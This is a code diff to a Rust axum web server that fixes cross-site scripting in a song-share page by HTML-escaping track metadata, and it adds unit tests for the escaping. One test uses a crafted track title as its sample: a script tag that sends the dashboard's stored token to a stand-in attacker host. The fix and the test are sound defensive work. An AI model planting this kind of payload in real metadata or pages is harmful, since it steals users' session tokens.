@@ -2,6 +2,7 @@ use axum::{
     extract::{Path, State},
     response::Html,
 };
+use crate::listen::escape_html;
 use crate::AppState;
 
 pub async fn share_handler(
@@ -69,9 +70,13 @@ pub async fn share_handler(
   </div>
 </body>
 </html>"#,
-            title = share.track_title,
-            artist = share.artist_name,
-            audio_url = share.audio_url
+            // Escaped, not trusted. A track title is library metadata — it arrives from a file's
+            // tags or from a backend, neither of which this server authored — and it is placed
+            // straight into this page's markup. Unescaped, a crafted title is script execution on
+            // the origin that holds the dashboard's device token.
+            title = escape_html(&share.track_title),
+            artist = escape_html(&share.artist_name),
+            audio_url = escape_html(&share.audio_url)
         );
         Html(html)
     } else {
@@ -85,5 +90,24 @@ pub async fn share_handler(
   </div>
 </body>
 </html>"#.to_string())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use crate::listen::escape_html;
+
+    /// A title is library metadata: it comes from a file's tags or a backend, never from here.
+    #[test]
+    fn a_crafted_track_title_cannot_execute() {
+        let hostile = r#"Song</audio><script>fetch('//evil.test?t='+localStorage.token)</script>"#;
+        let escaped = escape_html(hostile);
+        assert!(!escaped.contains('<'));
+        assert!(!escaped.contains('>'));
+    }
+
+    #[test]
+    fn an_ordinary_title_is_unchanged() {
+        assert_eq!(escape_html("unravel"), "unravel");
     }
 }
